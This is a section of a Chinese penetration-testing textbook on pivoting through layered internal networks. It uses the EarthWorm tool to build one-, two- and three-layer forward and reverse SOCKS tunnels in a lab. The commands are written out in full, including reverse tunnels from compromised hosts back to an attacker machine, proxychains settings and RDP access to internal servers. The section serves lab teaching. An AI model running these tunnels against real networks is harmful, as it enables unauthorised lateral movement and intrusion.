



### 3.5.1 通过EW进行隧道穿透
在进行多层网段渗透时，我们经常会遇到各种代理隧道问题，仅靠使用端口转发无法完成，可以利用Socks协议建立隧道进行连接，Socks是代理服务可以说是lcx端口转发工具的升级版，有两种协议，分别是Socks 4和Socks 5。Socks 4只支持TCP，Socks 5支持TCP/UDP，核心功能是帮助他人通过socks访问网络。在主机上配置Socks协议代理服务，访问网站时Socks充当了中间人的角色，分别与双方（B/S）进行通信，然后将获得的结果通知对方，攻击者可以通过Socks客户端连接Socks服务，进而实现跳板攻击，EW工具使用具体参数如表3-13所示。<br />表3-13 EW参数介绍

| 参数 | 作用 |
| --- | --- |
| Ssocksd | 正向代理 |
| Rcsock | 反向代理客户端 |
| Rssocks | 反向代理服务端 |
| Lcx_slave | 一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机 |
| Lcx_tran | 通过监听本地端口接收代理请求，并转发给代理提供主机 |
| Lcx_listen | 通过监听本地端口接收数据，并将其转交给目标网络会连的代理提供主机 |

假设在内网渗透中发现主机，通过漏洞获取到管理权限，以Earthworm内网穿透工具为案例，通过socks协议演示连通内外网，本次实验环境如表3-14所示，实验拓扑如图3-134所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683832254-64d89a31-f314-42f3-a92a-be13e2b04d55.png#)<br />图3-134通过EW进行隧道穿透<br />表3-14 通过EW进行隧道穿透实验环境表

| 主机类型 | 服务类型 | IP地址 | 区域 |
| --- | --- | --- | --- |
| Kali 2022 | 攻击机 | 192.168.0.58 | 外网 |
| Windows server 2012 | Web服务器 | 192.168.0.25, 192.168.52.11 | DMZ区域 |
| windows server 2008 | FTP 服务器 | 192.168.52.12, 192.168.1.49 | DMZ区域 |
| windows 10 | PC主机 | 192.168.1.50, 192.168.2.2 | 办公区域 |
| Windows server 2012 | 核心服务器 | 192.168.2.3 | 核心区域 |

#### 1.一层正向连接
    1）假设拿到Web服务器的Webshell权限后，探测到无法访问外网，这时上传EW工具到Web服务器进行隧道穿透。使用EW工具的ssocksd参数做正向代理，设置Socks代理监听本地8888端口，执行命令ew_for_Win.exe -s ssocksd -l 8888，其中-s参数是指定选择参数，这里指定ssocksd做正向代理，-l参数是指定本地监听端口，如图3-135所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683832482-94005bd7-9d9a-4351-ae9d-f7689cc2c892.png#)<br />图3-135启动正向代理<br />   2）在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 192.168.0.25 8888参数来完成 proxychains代理配置，如图3-136所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683832715-d0beb931-fe22-4ad7-8517-5ab6fb4524f2.png#)<br />图3-136 修改proxychains配置文件<br />    3）当配置完 proxychains 代理后，即可在攻击机执行proxychains rdesktop 192.168.52.12命令来连接FTP服务器，如图3-137所示，通过所建立的socks协议隧道，我们可以直接远程连接到FTP服务器中。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683833080-1e0e91b7-d4ad-4918-9732-0c39b1befc34.png#)<br />图3-137连接成功
#### 2.一层反向代理
    1）假设当Web服务器它允许访问外部网络的情况下，可以利用EW工具以反向代理的方式进行socks隧道穿透，在Web服务器使用EW工具执行ew_for_Win.exe -s rssocks -d 192.168.0.58 -e 6666命令，连接攻击机服务端稍后监听的6666端口，-rssocks参数指连接反向代理服务端，-d参数指向攻击机的IP，-e参数指向攻击机开启监听的端口如图3-138所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683833543-2ad51800-3f8d-4fda-be67-facf67f8b731.png#)<br />图3-138跳板机执行命令<br />    2）在攻击机上使用EW工具开启服务端监听，执行./ew_for_linux64 -s rcsocks -e 6666 -d 8888命令，监听本地6666端口，同时6666端口流量映射到8888端口。其中-s参数指定使用rcsocks反向代理的方式，-e参数在这里是指攻击机服务端开启监听端口，-d参数是将要映射的端口，如图3-139所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683833781-9685d431-bd9e-4bfa-b41c-d81cca82e8eb.png#)<br />图3-139攻击机执行命令<br /> 3）在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 127.0.0.1 8888参数来完成proxychains代理配置，如图3-140所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683834015-31ff0caf-0b2b-43e2-aa7e-c5b45e978b06.png#)<br />图3-140修改proxychains配置文件<br />    4）当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.52.12命令来连接FTP服务器，如图3-141所示，通过所建立的socks协议隧道，我们可以直接远程连接到FTP服务器中。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683834303-56831c34-8953-43f6-aa1a-d995d3627c3e.png#)<br />图3-141一层反向连接成功
#### 3.二层正向代理
  通过上述场景实现隧道穿透，通过后续利用获取到FTP权限，接着探测到办公区域PC主机开放RDP服务3389端口，通过获取到的凭证打算对其进行连接，在这里继续通过EW工具，实现在二层内网代理中连接PC主机的远程桌面服务，但PC主机只与FTP服务器连通，可以通过FTP服务器与Web服务器之间搭建隧道，在与kali攻击机搭建隧道，进行访问。<br /> 1）假设通过上述实验获取了FTP的控制权，在FTP服务器主机上传EW工具，执行ew_for_Win.exe -s ssocksd -l 8888命令，开启监听本机8888端口，如图3-142所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683834882-9112ea4e-cc5b-4568-a172-c62b0f750d31.png#)<br />图3-142 FTP服务器执行命令<br />    2）在Web服务器使用EW工具，执行ew_for_Win.exe -s lcx_tran -l 7777 -f 192.168.52.12 -g 8888命令，使用Web服务器的7777端口连接FTP服务器的8888端口，在它们中间搭建一条隧道，其中-f指定FTP服务器的IP，-g指定FTP服务器监听端口，-l指定本机监听端口，此时隧道已搭建成功，如图3-143所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683835070-b4e395c1-02cd-4ab8-b9a6-2d18ad782fe9.png#)<br />图3-143出网边界机执行命令<br />    3）在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 192.168.0.25 7777参数来完成 proxychains代理配置，如图3-144所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683835296-5acf24c0-cc75-4dae-aa64-a21aaf758312.png#)<br />图3-144修改proxychains配置文件<br />    4）当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.1.50命令来连接PC主机，如图 3-145 所示，通过所建立的socsk协议隧道，我们可以直接远程连接到PC主机。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683835549-a2ac461f-9f94-4413-ace9-5b09dbbe833c.png#)<br />图3-145二层正向代理连接成功
#### 4.二层反向代理
    1）假设当FTP服务器允许出网时，以反向代理为案例，演示二层反向代理如何进行隧道穿透，在FTP服务器执行ew_for_Win.exe -s ssocksd -l 8888"命令，设置监听8888端口，如图3-146所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683835841-10bf7e3a-9e88-4897-9165-fa4cd913e564.png#)<br />图3-146 FTP服务器执行命令<br />    2）在kali攻击机上开启本地监听，执行./ew_for_linux64 -s lcx_listen -l 8888 -e 7777命令，将稍后用于连接kali攻击机的7777端口转发到它的8888端口上。如图3-147所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683836109-e602dc76-626e-412f-91e9-6090e9abe190.png#)<br />图3-147攻击机执行命令<br />    3）接下来在Web服务器执行ew_for_Win.exe -s lcx_slave -d 192.168.0.58 -e 7777 -f 192.168.52.12 -g 8888命令，将FTP服务器的8888端口转发到Kali攻击机的7777监听端口，如图3-148所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683836352-dd70bd37-d2e1-4b9f-963a-ee308713a06a.png#)<br />图3-148执行命令<br />    4）在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 127.0.0.1 8888参数来完成proxychains代理配置，如图3-149所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683836580-d614ec3c-b6cf-400c-babc-badd1f7df066.png#)<br />图3-149修改proxychains配置文件

1. 当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.1.50命令来连接PC主机，如图3-150 所示，通过所建立的socsk协议隧道，我们可以直接远程连接到PC主机。

![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683836850-b9e68843-d3e2-40a3-b490-e1af38cf4633.png#)<br />图3-150二层反向代理连接成功
#### 5.三层正向代理
假设通过上述描述，利用隧道穿透获取到了办公区域的PC机权限，探测后发现核心服务器的存在于PC主机处于同一网段，通过已知的凭据，最终目标是利用上传EW工具进行隧道穿透获取到核心服务器的权限。<br /> 1）假设在内网中PC主机不允许出网，利用正向代理的方式，执行ew_for_Win.exe -s ssocksd -l 8888命令，在PC主机上设置本地监听端口为8888，如图3-151所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683837186-e6a660de-dea3-4821-94e9-582cd9848f2e.png#)<br />图3-151设置本地端口监听<br />    2）在FTP服务器执行ew_for_Win.exe -s lcx_tran 7777 -f 192.168.1.50 -g 8888命令连接PC主机设置的监听，同时将流量转发给本地的7777端口。如图3-152所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683837430-5e83d847-7add-4315-8954-bfdd51c00129.png#)<br />图3-152设置PC主机监听<br />    3）继续在FTP服务器另外在打开cmd命令行，执行ew_for_Win.exe -s ssocksd -l 7777， 开启监听本地7777端口，如图3-153所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683837643-b7a1490a-a93a-4159-8424-eabbab649b5c.png#)图3-153监听本地7777端口<br />    4）然后在Web服务器使用EW工具执行ew_for_Win.exe -s lcx_tran 8888 -f 192.168.52.12 7777命令，去连接FTP服务器的7777端口，转发到Web服务器的8888端口如图3-154所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683837845-075b61bf-2c6b-4572-90c1-ebf8628df288.png#)图3-154端口转发<br />    5）接下来在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 192.168.0.25 8888参数来完成 proxychains 代理配置，如图3-155所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683838073-40b68163-5364-4978-8c4b-6130d7d4baf6.png#)<br />图3-155配置socks5代理<br />    6）当配置完 proxychains 代理后，即可在攻击机执行proxychains rdesktop 192.168.2.3命令来连接靶机，如图 3-156 所示，通过所建立的 socks 协议隧道，我们可以直接远程连接到“靶机”中。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683838307-766f1e3c-8fd8-4fa4-814b-3ba8949b44d0.png#)<br />图3-156连接成功
#### 6.三层反向代理
根据上述所讲情况，假设PC主机可以出外网，利用EW工具使用反向连接的方式来进行演示三层隧道穿透。<br />1）在攻击机kali进行设置，执行ew_for_Win.exe -s rcsocks -l 1080 -e 8888命令设置监听本地端口8888指向本地1080端口，如图3-157所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683838639-84fe435c-4295-4028-9da0-f67a1ad756cc.png#)<br />图3-157反向连接<br />    2）在Web服务器设置监听执行ew_for_Win.exe -s lcx_slave -d 192.168.0.58 -e 8888 -f 192.168.52.12 -g 9999命令，将稍后监听到FTP服务器的9999端口流量转发到kali攻击机的8888端口，如图3-158所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683838900-058bdd67-3588-4583-937e-28ad31e2ecc9.png#)<br />图3-158转发端口<br />3）接下来在FTP服务器设置，将FTP稍后监听7777端口的流量转发给本地的9999端口，执行ew_for_Win.exe -s lcx_listen -l 9999 -e 7777命令，这里是指稍后搭建的隧道流量，会通过本地的7777端口转发到本地的9999端口，如图3-159所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683839133-d7ac11dd-c47b-43ee-854e-55a1d16571f0.png#)<br />图3-159流量端口转发<br />    4）最后在PC主机设置，执ew_for_Win.exe  -s rssocks -d 192.168.1.49 -e 7777命令，将流量转发到FTP服务器的7777端口，此时隧道已经连接通，如图3-160所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683839363-e355be80-f33c-416a-9240-d04d7aef6785.png#)<br />图3-160流量端口转发<br />5）此时隧道已完成，在攻击机中修改 proxychains4.conf配置文件，并在其底部添加一行socks5 127.0.0.1 1080参数来完成proxychains代理配置，如图3-161所示。<br />![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683839588-ce8431fc-b2b1-4758-b999-e54c13b2f801.png#)<br />图3-161修改proxychains配置文件

1. 当配置完proxychains代理后，即可在攻击机执行proxychains rdesktop 192.168.2.3命令来连接靶机，如图3-162所示，通过所建立的socks协议隧道，我们可以直接远程连接到靶机。

![](https://cdn.nlark.com/yuque/0/2023/png/1137595/1699683839855-b45359d7-03df-4301-8042-b7ad41f517e3.png#)<br />图3-162连接内网靶机


